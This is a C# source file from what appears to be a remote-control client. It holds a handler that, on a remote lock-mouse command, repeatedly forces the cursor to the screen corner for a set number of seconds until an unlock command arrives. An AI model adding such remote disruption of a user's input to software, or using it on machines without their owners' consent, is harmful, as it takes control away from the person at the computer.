using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using RemoteControl.Protocals;
using Microsoft.Win32;
using RemoteControl.Audio;
using RemoteControl.Audio.Codecs;
using System.Threading;
using System.IO;
using RemoteControl.Protocals.Response;

namespace RemoteControl.Client.Handlers
{
    class RequestLockMouseHandler : AbstractRequestHandler
    {
        private bool _isRunning = false;
        private RequestLockMouse _request = null;
        public override void Handle(SocketSession session, ePacketType reqType, object reqObj)
        {
            if (reqType == ePacketType.PACKET_LOCK_MOUSE_REQUEST)
            {
                // 开始
                var req = reqObj as RequestLockMouse;
                if (_request == null)
                {
                    _request = req;
                    _isRunning = true;
                    RunTaskThread(StartLockMouse, session);
                }
                else
                {
                    return;
                }
            }
            else if (reqType == ePacketType.PACKET_UNLOCK_MOUSE_REQUEST)
            {
                // 停止
                _isRunning = false;
            }
        }

        private void StartLockMouse(SocketSession session)
        {
            for (int i = 0; i < _request.LockSeconds; i++)
            {
                if (!_isRunning)
                    break;
                for (int j = 0; j < 100; j++)
                {
                    MouseOpeUtil.MouseMove(0, 0);
                    Thread.Sleep(10);
                }
            }
            _isRunning = false;
            _request = null;
        }
    }
}
